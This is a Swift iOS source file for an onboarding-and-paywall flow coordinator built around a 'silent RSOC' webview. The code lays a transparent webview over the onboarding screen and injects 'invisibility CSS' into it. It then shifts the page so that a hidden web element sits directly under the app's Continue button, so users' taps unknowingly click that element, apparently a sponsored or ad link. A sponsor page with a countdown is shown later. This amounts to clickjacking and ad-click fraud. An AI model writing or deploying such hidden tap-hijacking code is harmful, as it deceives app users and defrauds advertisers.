import SnapKit
import UIKit
import WebKit

/// Container controller that orchestrates the RSOC flow with onboarding and paywall.
///
/// This controller manages the RSOC WebView overlay on top of the onboarding,
/// handles screen transitions, and coordinates sponsor page display after paywall.
///
/// ## Usage
/// ```swift
/// let coordinator = RSOCFlowCoordinator(
///     onboarding: myOnboarding,
///     paywallProvider: { MyPaywall() },
///     onOnboardingComplete: { /* save flag */ },
///     sponsorViewConfig: .default
/// )
/// coordinator.completion = { [weak self] in
///     self?.showMainScreen()
/// }
/// window?.rootViewController = coordinator
/// ```
public final class RSOCFlowCoordinator: UIViewController, UIGestureRecognizerDelegate {
    
    /// Called when the entire flow (onboarding + paywall) is complete.
    public var completion: (() -> Void)?
    
    private let onboardingController: RSOCOnboardingProtocol
    private let paywallProvider: @Sendable () -> RSOCPaywallProtocol
    private let onOnboardingComplete: (@Sendable () -> Void)?
    private let sponsorViewConfig: RSOCSponsorViewConfig
    
    private var rsocManager: SilentRSOCManager { SilentRSOCManager.shared }
    private var isRSOCActive = false
    private var rsocWebViewContainer: UIView?
    private var hasSetupRSOC = false
    nonisolated(unsafe) private var pendingFallbackAdvance: DispatchWorkItem?
    private var shouldDisableRSOCAfterPaywall = false
    private var isHandlingNavigation = false
    
    /// Creates a new RSOC flow coordinator.
    ///
    /// - Parameters:
    ///   - onboarding: The onboarding view controller conforming to `RSOCOnboardingProtocol`.
    ///   - paywallProvider: A closure that creates a new paywall instance.
    ///   - onOnboardingComplete: Called when onboarding completes (before paywall). Use this to save flags.
    ///   - sponsorViewConfig: Configuration for the sponsor view appearance.
    public init(
        onboarding: RSOCOnboardingProtocol,
        paywallProvider: @escaping @Sendable () -> RSOCPaywallProtocol,
        onOnboardingComplete: (@Sendable () -> Void)? = nil,
        sponsorViewConfig: RSOCSponsorViewConfig = .default
    ) {
        self.onboardingController = onboarding
        self.paywallProvider = paywallProvider
        self.onOnboardingComplete = onOnboardingComplete
        self.sponsorViewConfig = sponsorViewConfig
        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    deinit {
        pendingFallbackAdvance?.cancel()
    }
    
    public override func viewDidLoad() {
        super.viewDidLoad()
        showOnboarding()
    }
    
    public override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        
        if !hasSetupRSOC {
            hasSetupRSOC = true
            setupRSOCIfNeeded()
        }
    }
    
    public override var childForScreenEdgesDeferringSystemGestures: UIViewController? {
        return children.last
    }
    
    public override var childForHomeIndicatorAutoHidden: UIViewController? {
        return children.last
    }
    
    // MARK: - Onboarding
    
    private func showOnboarding() {
        onboardingController.completion = { [weak self] in
            self?.handleOnboardingCompletion()
        }
        
        addChild(onboardingController)
        view.addSubview(onboardingController.view)
        onboardingController.view.frame = view.bounds
        onboardingController.didMove(toParent: self)
    }
    
    // MARK: - RSOC Setup
    
    private func setupRSOCIfNeeded() {
        guard rsocManager.isEnabled,
              rsocManager.isReady,
              let webView = rsocManager.webView
        else {
            print("⚠️ RSOC setup skipped: enabled=\(rsocManager.isEnabled), ready=\(rsocManager.isReady), webView=\(rsocManager.webView != nil)")
            return
        }
        
        print("✅ RSOC setup starting")
        isRSOCActive = true
        
        let container = UIView()
        container.backgroundColor = .clear
        container.isUserInteractionEnabled = true
        container.clipsToBounds = false
        view.addSubview(container)
        rsocWebViewContainer = container
        
        container.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        
        webView.backgroundColor = .clear
        webView.isOpaque = false
        webView.scrollView.backgroundColor = .clear
        webView.alpha = 1
        container.addSubview(webView)
        
        webView.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        
        let tapGesture = UITapGestureRecognizer(target: self, action: #selector(handleWebViewTap(_:)))
        tapGesture.delegate = self
        tapGesture.cancelsTouchesInView = false
        webView.addGestureRecognizer(tapGesture)
        
        rsocManager.onNavigationDetected = { [weak self] in
            print("🔗 Navigation detected - cancelling fallback and handling")
            self?.pendingFallbackAdvance?.cancel()
            self?.pendingFallbackAdvance = nil
            self?.handleRSOCNavigation()
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { [weak self] in
            self?.alignRSOCWebView()
        }
        
        rsocManager.injectInvisibilityCSS()
    }
    
    private func alignRSOCWebView() {
        guard isRSOCActive, let webView = rsocManager.webView else {
            print("⚠️ alignRSOCWebView skipped: active=\(isRSOCActive)")
            return
        }
        
        webView.transform = .identity
        
        let buttonFrame = onboardingController.getContinueButtonFrame()
        let buttonFrameInContainer = onboardingController.view.convert(buttonFrame, to: view)
        
        print("📍 Button frame: \(buttonFrameInContainer)")
        
        let currentScreen = rsocManager.currentScreen
        print("📍 Aligning for screen: \(currentScreen)")
        
        rsocManager.getElementRect(for: currentScreen) { [weak self] elementRect in
            guard let self = self else { return }
            
            guard let elementRect = elementRect else {
                print("⚠️ RSOC element not found for screen \(currentScreen)")
                self.disableRSOC()
                return
            }
            
            print("📍 RSOC element rect: \(elementRect)")
            
            let buttonCenter = CGPoint(
                x: buttonFrameInContainer.origin.x + buttonFrameInContainer.width / 2,
                y: buttonFrameInContainer.origin.y + buttonFrameInContainer.height / 2
            )
            
            let offsetX: CGFloat
            let offsetY: CGFloat
            
            switch currentScreen {
            case .screen1:
                let elementCenter = CGPoint(
                    x: elementRect.origin.x + elementRect.width / 2,
                    y: elementRect.origin.y + elementRect.height / 2
                )
                offsetX = buttonCenter.x - elementCenter.x
                offsetY = buttonCenter.y - elementCenter.y
                
            case .screen2:
                offsetX = 0
                offsetY = buttonCenter.y - 200 - elementRect.origin.y
                
            case .sponsor:
                return
            }
            
            print("📍 Transform offset: x=\(offsetX), y=\(offsetY)")
            
            webView.transform = CGAffineTransform(translationX: offsetX, y: offsetY)
            webView.isHidden = false
            self.rsocWebViewContainer?.isHidden = false
        }
    }
    
    @objc private func handleWebViewTap(_ gesture: UITapGestureRecognizer) {
        print("👆 Webview tapped - setting up 1s fallback navigation")
        
        pendingFallbackAdvance?.cancel()
        
        let workItem = DispatchWorkItem { [weak self] in
            guard let self = self, self.isRSOCActive else { return }
            print("⏰ Fallback timer fired (no navigation detected) - advancing manually")
            
            if self.rsocManager.currentScreen == .screen2 {
                print("⚠️ Fallback during screen2 - will disable RSOC after paywall")
                self.shouldDisableRSOCAfterPaywall = true
            }
            
            self.handleRSOCNavigation()
        }
        
        pendingFallbackAdvance = workItem
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0, execute: workItem)
    }
    
    private func handleRSOCNavigation() {
        guard isRSOCActive else {
            print("⚠️ handleRSOCNavigation: RSOC not active")
            return
        }
        
        pendingFallbackAdvance?.cancel()
        pendingFallbackAdvance = nil
        
        isHandlingNavigation = true
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { [weak self] in
            self?.isHandlingNavigation = false
        }
        
        let previousScreen = rsocManager.currentScreen
        print("🔄 RSOC navigation: \(previousScreen) -> next")
        rsocManager.advanceToNextScreen()
        let newScreen = rsocManager.currentScreen
        print("🔄 RSOC now on screen: \(newScreen)")
        
        switch newScreen {
        case .screen1:
            break
        case .screen2:
            print("📱 Advancing onboarding for screen 2")
            rsocManager.webView?.isHidden = true
            onboardingController.advanceStep()
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { [weak self] in
                self?.rsocManager.injectInvisibilityCSS()
                self?.alignRSOCWebView()
                self?.rsocManager.webView?.isHidden = false
            }
        case .sponsor:
            print("📱 Advancing onboarding for sponsor page")
            onboardingController.advanceStep()
            rsocWebViewContainer?.isHidden = true
        }
    }
    
    private func disableRSOC() {
        isRSOCActive = false
        rsocWebViewContainer?.removeFromSuperview()
        rsocWebViewContainer = nil
    }
    
    // MARK: - Paywall
    
    private func handleOnboardingCompletion() {
        onOnboardingComplete?()
        
        let paywall = paywallProvider()
        presentPaywall(paywall)
    }
    
    private func presentPaywall(_ paywall: RSOCPaywallProtocol) {
        onboardingController.willMove(toParent: nil)
        onboardingController.view.removeFromSuperview()
        onboardingController.removeFromParent()
        
        if shouldDisableRSOCAfterPaywall {
            print("🚫 Disabling RSOC after paywall (fallback during screen2)")
            disableRSOC()
            shouldDisableRSOCAfterPaywall = false
        }
        
        if isRSOCActive {
            paywall.rsocSponsorWebView = rsocManager.sponsorWebView
            paywall.isSponsorPageVisible = rsocManager.isSponsorPageVisible
        }
        
        paywall.closeAction = { [weak self] in
            self?.handlePaywallClose(paywall: paywall)
        }
        
        addChild(paywall)
        view.addSubview(paywall.view)
        paywall.view.frame = view.bounds
        paywall.didMove(toParent: self)
        
        setNeedsUpdateOfScreenEdgesDeferringSystemGestures()
        setNeedsUpdateOfHomeIndicatorAutoHidden()
    }
    
    private func handlePaywallClose(paywall: RSOCPaywallProtocol) {
        if paywall.isSponsorPageVisible, let sponsorWebView = paywall.rsocSponsorWebView {
            showSponsorPage(sponsorWebView, paywall: paywall)
        } else {
            paywall.rsocSponsorWebView?.removeFromSuperview()
            finishFlow()
        }
    }
    
    private func showSponsorPage(_ webView: WKWebView, paywall: RSOCPaywallProtocol) {
        IntegrationFramework.shared.log(event: .silentRsocSponsoredPageVisible)
        
        let sponsorView = RSOCSponsorView(config: sponsorViewConfig)
        sponsorView.onCountdownFinished = { [weak self] in
            self?.dismissSponsorPage()
        }
        sponsorView.embedWebView(webView)
        sponsorView.startCountdown()
        
        paywall.view.addSubview(sponsorView)
        sponsorView.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
    }
    
    private func dismissSponsorPage() {
        finishFlow()
    }
    
    private func finishFlow() {
        rsocManager.cleanup()
        completion?()
    }
    
    // MARK: - UIGestureRecognizerDelegate
    
    public func gestureRecognizer(
        _ gestureRecognizer: UIGestureRecognizer,
        shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer
    ) -> Bool {
        return true
    }
}
